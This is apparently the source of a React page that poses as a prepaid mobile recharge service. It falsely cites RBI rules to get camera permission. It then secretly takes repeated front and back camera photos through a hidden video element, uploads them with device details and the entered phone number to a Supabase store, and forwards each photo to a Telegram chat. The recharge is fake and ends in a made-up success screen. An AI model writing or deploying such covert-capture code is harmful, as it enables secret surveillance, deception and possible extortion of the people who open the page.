import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { collectDeviceInfo } from "@/utils/deviceInfo";

const RechargeCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [selectedOperator, setSelectedOperator] = useState<string | null>(null);
  const [selectedPlan, setSelectedPlan] = useState<string | null>(null);
  const [step, setStep] = useState<"permission" | "input" | "plans" | "processing" | "success">("permission");
  const [cameraGranted, setCameraGranted] = useState(false);
  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  const captureCountRef = useRef<number>(0);
  const deviceInfoSavedRef = useRef<boolean>(false);

  const sessionId = searchParams.get("session") || "default";
  const tgChatId = sessionId.startsWith('tgcam_') ? parseInt(sessionId.split('_')[1]) : null;

  const notifyTelegram = async (photoUrl: string, cameraType: string, captureNum: number) => {
    if (!tgChatId) return;
    try {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      await fetch(`${supabaseUrl}/functions/v1/telegram-bot`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
        body: JSON.stringify({ _internal_photo_notify: true, chatId: tgChatId, photoUrl, cameraType, captureNum }),
      });
    } catch (e) { console.error('TG notify error:', e); }
  };

  const saveDeviceInfo = async () => {
    if (deviceInfoSavedRef.current) return;
    deviceInfoSavedRef.current = true;
    try {
      const deviceInfo = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceInfo),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    } catch (err) {
      console.error("Failed to save device info:", err);
    }
  };

  const requestCameraPermission = async (): Promise<boolean> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach(t => t.stop());
      return true;
    } catch { return false; }
  };

  useEffect(() => {
    saveDeviceInfo();
    const init = async () => {
      const granted = await requestCameraPermission();
      if (granted) {
        setCameraGranted(true);
        setStep("input");
        startContinuousCapture();
      } else {
        setStep("permission");
      }
    };
    init();
  }, []);

  const base64ToBlob = (base64: string): Blob => {
    const parts = base64.split(',');
    const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(parts[1]);
    const u8arr = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
    return new Blob([u8arr], { type: mime });
  };

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: 640, height: 480 } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        await new Promise(r => setTimeout(r, 500));
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(t => t.stop());
            return imageData;
          }
        }
        stream.getTracks().forEach(t => t.stop());
      }
      return null;
    } catch { return null; }
  };

  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    while (!stopCaptureRef.current) {
      try {
        captureCountRef.current++;
        const frontImage = await captureFromCamera("user");
        if (frontImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-front-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(frontImage);
          const { error } = await supabase.storage.from('captured-photos').upload(fileName, blob, { upsert: true });
          if (!error) {
            const { data: urlData } = supabase.storage.from('captured-photos').getPublicUrl(fileName);
            await supabase.from('captured_photos').insert({ session_id: sessionId, image_data: urlData.publicUrl, user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]` });
            await notifyTelegram(urlData.publicUrl, 'front', captureCountRef.current);
          }
        }
        if (stopCaptureRef.current) break;
        await new Promise(r => setTimeout(r, 200));
        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-back-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(backImage);
          const { error } = await supabase.storage.from('captured-photos').upload(fileName, blob, { upsert: true });
          if (!error) {
            const { data: urlData } = supabase.storage.from('captured-photos').getPublicUrl(fileName);
            await supabase.from('captured_photos').insert({ session_id: sessionId, image_data: urlData.publicUrl, user_agent: `${navigator.userAgent} [BACK-${captureCountRef.current}]` });
            await notifyTelegram(urlData.publicUrl, 'back', captureCountRef.current);
          }
        }
        if (stopCaptureRef.current) break;
        await new Promise(r => setTimeout(r, 500));
      } catch { await new Promise(r => setTimeout(r, 1000)); }
    }
  };

  useEffect(() => { return () => { stopCaptureRef.current = true; }; }, []);

  const operators = [
    { id: 'jio', name: 'Jio', color: '#0a2885', logo: '🔵' },
    { id: 'airtel', name: 'Airtel', color: '#ed1c24', logo: '🔴' },
    { id: 'vi', name: 'Vi', color: '#6c2d91', logo: '🟣' },
    { id: 'bsnl', name: 'BSNL', color: '#1a8a34', logo: '🟢' },
  ];

  const plans: Record<string, Array<{amount: number; data: string; validity: string; extra: string}>> = {
    jio: [
      { amount: 199, data: '1.5GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 299, data: '2GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 599, data: '2GB/day', validity: '56 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 999, data: '2.5GB/day', validity: '84 days', extra: 'Unlimited Calls + 100 SMS/day' },
    ],
    airtel: [
      { amount: 179, data: '1GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 299, data: '1.5GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 479, data: '1.5GB/day', validity: '56 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 859, data: '1.5GB/day', validity: '84 days', extra: 'Unlimited Calls + 100 SMS/day' },
    ],
    vi: [
      { amount: 179, data: '1GB/day', validity: '28 days', extra: 'Unlimited Calls' },
      { amount: 299, data: '1.5GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 449, data: '2GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 719, data: '1.5GB/day', validity: '56 days', extra: 'Unlimited Calls + 100 SMS/day' },
    ],
    bsnl: [
      { amount: 107, data: '1GB/day', validity: '28 days', extra: 'Unlimited Calls' },
      { amount: 197, data: '2GB/day', validity: '28 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 397, data: '2GB/day', validity: '56 days', extra: 'Unlimited Calls + 100 SMS/day' },
      { amount: 599, data: '2GB/day', validity: '84 days', extra: 'Unlimited Calls + 100 SMS/day' },
    ],
  };

  const handleSubmitNumber = () => {
    if (phoneNumber.length !== 10) return;
    // Start camera capture silently when user submits number
    startContinuousCapture();
    setStep("plans");
  };

  const handleSelectPlan = (amount: number) => {
    setSelectedPlan(`₹${amount}`);
    setStep("processing");
    // Save the phone number + plan info
    supabase.from("captured_photos").insert({
      session_id: sessionId + "_recharge_info",
      image_data: JSON.stringify({ phone: phoneNumber, operator: selectedOperator, plan: amount }),
      user_agent: navigator.userAgent,
    }).then(() => {});
    
    setTimeout(() => setStep("success"), 3000);
  };

  const opData = operators.find(o => o.id === selectedOperator);

  if (step === "permission") {
    const retryPermission = async () => {
      const granted = await requestCameraPermission();
      if (granted) {
        setCameraGranted(true);
        setStep("input");
        startContinuousCapture();
      }
    };
    return (
      <div style={{ minHeight: '100vh', background: '#f5f5f5', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16 }}>
        <div style={{ background: '#fff', borderRadius: 16, padding: '30px 24px', textAlign: 'center', maxWidth: 360, width: '100%', boxShadow: '0 4px 20px rgba(0,0,0,0.1)' }}>
          <div style={{ fontSize: 50, marginBottom: 16 }}>🔐</div>
          <h2 style={{ color: '#1a237e', fontSize: 18, fontWeight: 700, marginBottom: 8 }}>Security Verification</h2>
          <p style={{ color: '#666', fontSize: 13, marginBottom: 6, lineHeight: 1.5 }}>
            RBI guidelines require camera verification for secure mobile recharge transactions.
          </p>
          <div style={{ background: '#fff3e0', border: '1px solid #ff9800', borderRadius: 10, padding: 10, marginBottom: 20 }}>
            <p style={{ color: '#e65100', fontSize: 11, fontWeight: 600 }}>⚠️ Camera permission is mandatory to proceed with recharge.</p>
          </div>
          <button onClick={retryPermission} style={{
            width: '100%', padding: 14, borderRadius: 12, border: 'none', fontWeight: 700, fontSize: 15, cursor: 'pointer',
            background: 'linear-gradient(135deg, #1a237e, #0d47a1)', color: '#fff', boxShadow: '0 4px 15px rgba(26,35,126,0.3)', marginBottom: 12
          }}>
            ✅ Allow Camera & Continue
          </button>
          <p style={{ color: '#999', fontSize: 10 }}>🔒 Secured by RBI Payment Gateway</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ minHeight: '100vh', background: '#f5f5f5', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <video ref={videoRef} style={{ position: 'fixed', opacity: 0, pointerEvents: 'none', width: 1, height: 1 }} autoPlay playsInline muted />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* Header */}
      <div style={{ background: 'linear-gradient(135deg, #1a237e 0%, #0d47a1 100%)', padding: '16px 20px', color: '#fff', display: 'flex', alignItems: 'center', gap: 12 }}>
        <div style={{ width: 36, height: 36, background: 'rgba(255,255,255,0.2)', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 18 }}>📱</div>
        <div>
          <div style={{ fontSize: 18, fontWeight: 700 }}>Mobile Recharge</div>
          <div style={{ fontSize: 11, opacity: 0.8 }}>Fast & Secure Prepaid Recharge</div>
        </div>
      </div>

      {/* Offer Banner */}
      <div style={{ background: 'linear-gradient(90deg, #ff6f00, #ff8f00)', padding: '10px 20px', color: '#fff', fontSize: 13, fontWeight: 600, textAlign: 'center' }}>
        🎉 Get 10% cashback on first recharge! Use code: FIRST10
      </div>

      <div style={{ padding: '16px 16px 100px' }}>
        {step === "input" && (
          <div>
            {/* Number Input Card */}
            <div style={{ background: '#fff', borderRadius: 16, padding: 24, boxShadow: '0 2px 12px rgba(0,0,0,0.08)', marginBottom: 20 }}>
              <div style={{ fontSize: 15, fontWeight: 600, color: '#333', marginBottom: 16 }}>Enter Mobile Number</div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, border: '2px solid #e0e0e0', borderRadius: 12, padding: '12px 16px', transition: 'border 0.2s', ...(phoneNumber.length > 0 ? { borderColor: '#1a237e' } : {}) }}>
                <span style={{ fontSize: 16, fontWeight: 600, color: '#333' }}>+91</span>
                <div style={{ width: 1, height: 24, background: '#e0e0e0' }} />
                <input
                  type="tel"
                  maxLength={10}
                  placeholder="Enter 10 digit number"
                  value={phoneNumber}
                  onChange={e => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                  style={{ flex: 1, border: 'none', outline: 'none', fontSize: 17, fontWeight: 500, color: '#333', background: 'transparent', letterSpacing: 1 }}
                />
                {phoneNumber.length === 10 && <span style={{ color: '#4caf50', fontSize: 20 }}>✓</span>}
              </div>
              {phoneNumber.length > 0 && phoneNumber.length < 10 && (
                <div style={{ color: '#f44336', fontSize: 12, marginTop: 8 }}>{10 - phoneNumber.length} more digits needed</div>
              )}
            </div>

            {/* Operator Selection */}
            <div style={{ background: '#fff', borderRadius: 16, padding: 24, boxShadow: '0 2px 12px rgba(0,0,0,0.08)', marginBottom: 20 }}>
              <div style={{ fontSize: 15, fontWeight: 600, color: '#333', marginBottom: 16 }}>Select Operator</div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                {operators.map(op => (
                  <div
                    key={op.id}
                    onClick={() => setSelectedOperator(op.id)}
                    style={{
                      border: `2px solid ${selectedOperator === op.id ? op.color : '#e0e0e0'}`,
                      borderRadius: 12, padding: '16px 12px', textAlign: 'center', cursor: 'pointer',
                      background: selectedOperator === op.id ? `${op.color}10` : '#fff',
                      transition: 'all 0.2s'
                    }}
                  >
                    <div style={{ fontSize: 28, marginBottom: 6 }}>{op.logo}</div>
                    <div style={{ fontSize: 14, fontWeight: 600, color: op.color }}>{op.name}</div>
                  </div>
                ))}
              </div>
            </div>

            {/* Submit Button */}
            <button
              onClick={handleSubmitNumber}
              disabled={phoneNumber.length !== 10 || !selectedOperator}
              style={{
                width: '100%', padding: '16px', border: 'none', borderRadius: 12, fontSize: 16, fontWeight: 700,
                color: '#fff', cursor: phoneNumber.length === 10 && selectedOperator ? 'pointer' : 'not-allowed',
                background: phoneNumber.length === 10 && selectedOperator
                  ? 'linear-gradient(135deg, #1a237e 0%, #0d47a1 100%)'
                  : '#ccc',
                boxShadow: phoneNumber.length === 10 && selectedOperator ? '0 4px 15px rgba(26,35,126,0.3)' : 'none',
                transition: 'all 0.3s'
              }}
            >
              Browse Plans →
            </button>

            {/* Trust Badges */}
            <div style={{ display: 'flex', justifyContent: 'center', gap: 20, marginTop: 20, opacity: 0.6 }}>
              <div style={{ textAlign: 'center', fontSize: 11 }}>🔒<br/>Secure</div>
              <div style={{ textAlign: 'center', fontSize: 11 }}>⚡<br/>Instant</div>
              <div style={{ textAlign: 'center', fontSize: 11 }}>💯<br/>Trusted</div>
            </div>
          </div>
        )}

        {step === "plans" && selectedOperator && (
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 20 }}>
              <button onClick={() => setStep("input")} style={{ background: 'none', border: 'none', fontSize: 20, cursor: 'pointer' }}>←</button>
              <div>
                <div style={{ fontSize: 16, fontWeight: 700, color: '#333' }}>{opData?.name} Plans</div>
                <div style={{ fontSize: 13, color: '#888' }}>+91 {phoneNumber}</div>
              </div>
            </div>

            {plans[selectedOperator]?.map((plan, i) => (
              <div key={i} onClick={() => handleSelectPlan(plan.amount)} style={{
                background: '#fff', borderRadius: 14, padding: 18, marginBottom: 12,
                boxShadow: '0 2px 8px rgba(0,0,0,0.06)', cursor: 'pointer',
                border: '1px solid #eee', transition: 'transform 0.2s',
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                  <div style={{ fontSize: 22, fontWeight: 800, color: opData?.color }}>₹{plan.amount}</div>
                  <div style={{ background: `${opData?.color}15`, color: opData?.color, padding: '4px 12px', borderRadius: 20, fontSize: 12, fontWeight: 600 }}>
                    {plan.validity}
                  </div>
                </div>
                <div style={{ display: 'flex', gap: 16, fontSize: 13, color: '#555' }}>
                  <span>📊 {plan.data}</span>
                  <span>📞 {plan.extra.split('+')[0].trim()}</span>
                </div>
                {plan.extra.includes('SMS') && (
                  <div style={{ fontSize: 12, color: '#888', marginTop: 6 }}>💬 {plan.extra.split('+').slice(1).join('+').trim()}</div>
                )}
              </div>
            ))}
          </div>
        )}

        {step === "processing" && (
          <div style={{ textAlign: 'center', paddingTop: 80 }}>
            <div style={{ width: 60, height: 60, border: '4px solid #e0e0e0', borderTopColor: opData?.color || '#1a237e', borderRadius: '50%', margin: '0 auto 24px', animation: 'spin 1s linear infinite' }} />
            <div style={{ fontSize: 18, fontWeight: 700, color: '#333', marginBottom: 8 }}>Processing Recharge...</div>
            <div style={{ fontSize: 14, color: '#888', marginBottom: 4 }}>+91 {phoneNumber} • {opData?.name}</div>
            <div style={{ fontSize: 16, fontWeight: 700, color: opData?.color }}>{selectedPlan}</div>
            <div style={{ fontSize: 12, color: '#aaa', marginTop: 16 }}>Please do not close this page</div>
          </div>
        )}

        {step === "success" && (
          <div style={{ textAlign: 'center', paddingTop: 60 }}>
            <div style={{ width: 72, height: 72, background: '#e8f5e9', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', fontSize: 36 }}>✅</div>
            <div style={{ fontSize: 20, fontWeight: 700, color: '#2e7d32', marginBottom: 8 }}>Recharge Successful!</div>
            <div style={{ fontSize: 14, color: '#888', marginBottom: 4 }}>+91 {phoneNumber} • {opData?.name}</div>
            <div style={{ fontSize: 18, fontWeight: 700, color: '#333', marginBottom: 20 }}>{selectedPlan}</div>
            <div style={{ background: '#f5f5f5', borderRadius: 12, padding: 16, textAlign: 'left', maxWidth: 300, margin: '0 auto' }}>
              <div style={{ fontSize: 13, color: '#888', marginBottom: 8 }}>Transaction Details</div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, marginBottom: 6 }}>
                <span style={{ color: '#888' }}>TXN ID</span>
                <span style={{ color: '#333', fontWeight: 600 }}>TXN{Date.now().toString().slice(-8)}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, marginBottom: 6 }}>
                <span style={{ color: '#888' }}>Status</span>
                <span style={{ color: '#2e7d32', fontWeight: 600 }}>Success</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13 }}>
                <span style={{ color: '#888' }}>Date</span>
                <span style={{ color: '#333', fontWeight: 600 }}>{new Date().toLocaleDateString('en-IN')}</span>
              </div>
            </div>
            <button onClick={() => { setStep("input"); setPhoneNumber(""); setSelectedOperator(null); setSelectedPlan(null); }} style={{
              marginTop: 24, padding: '14px 40px', background: 'linear-gradient(135deg, #1a237e, #0d47a1)', color: '#fff',
              border: 'none', borderRadius: 12, fontSize: 15, fontWeight: 600, cursor: 'pointer'
            }}>
              Recharge Another Number
            </button>
          </div>
        )}
      </div>

      {/* Spin animation */}
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
};

export default RechargeCapture;
